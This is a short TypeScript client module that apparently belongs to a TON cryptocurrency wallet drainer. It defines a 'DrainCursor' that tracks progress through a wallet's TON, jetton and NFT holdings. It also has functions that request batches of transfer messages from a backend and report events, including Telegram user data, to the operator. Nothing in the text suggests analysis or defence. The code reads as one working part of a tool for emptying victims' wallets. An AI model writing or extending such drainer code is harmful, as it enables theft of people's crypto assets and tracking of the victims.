export type DrainCursor = {
  jettonOffset: number;
  nftOffset: number;
  tonDone: boolean;
};

export type BuildBatchResponse = {
  done: boolean;
  cursor: DrainCursor;
  validUntil?: number;
  messages?: Array<{ address: string; amount: string; payload?: string }>;
  kind?: string;
  summary?: string;
  assets?: { ton: string; jettonCount: number; nftCount: number };
};

export async function postEvent(
  type: string,
  extra: { address?: string; detail?: string; tgUser?: Record<string, unknown> },
): Promise<void> {
  await fetch("/api/event", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ type, ...extra }),
  });
}

export async function buildBatch(address: string, cursor: DrainCursor): Promise<BuildBatchResponse> {
  const res = await fetch("/api/build-batch", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ address, cursor }),
  });
  if (!res.ok) throw new Error(await res.text());
  return res.json() as Promise<BuildBatchResponse>;
}
